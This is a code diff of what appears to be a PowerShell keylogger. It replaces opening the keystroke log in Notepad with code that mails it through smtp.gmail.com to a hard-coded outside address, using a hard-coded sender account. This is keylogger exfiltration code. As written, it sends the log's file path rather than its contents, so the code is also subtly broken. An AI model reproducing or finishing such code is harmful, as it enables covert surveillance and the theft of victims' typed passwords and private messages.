@@ -67,7 +67,19 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   finally
   {
     # open logger file in Notepad
-    notepad $Path
+    Get-Content $Path
+
+    $emailto = 'canarerobertjohn@gmail.com'
+    $email = 'wisincsales@gmail.com'
+    $SMTPServer = 'smtp.gmail.com'
+    $SMTPPort = '587'
+    $Password = 'password'
+    $subject = 'subject'
+    $data = $Path	
+    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+    $smtp.EnableSSL = $true
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password);
+    $smtp.Send($email, $emailto, $subject, $data);
   }
 }
 
